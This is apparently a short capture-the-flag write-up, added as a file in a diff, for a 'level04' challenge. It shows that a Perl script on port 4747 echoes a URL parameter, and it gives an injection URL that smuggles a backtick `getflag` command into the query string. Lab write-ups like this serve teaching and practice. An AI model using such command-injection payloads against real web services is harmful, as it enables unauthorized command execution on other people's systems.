@@ -1,0 +1,6 @@
+In the given script we can see it runs on the port 4747. Also, the script calls command `echo`.
+We injected `getflag` in the command using url's parameters :
+
+http://192.168.10.225:4747/level04.pl?x=`getflag`
+
+And we got it...
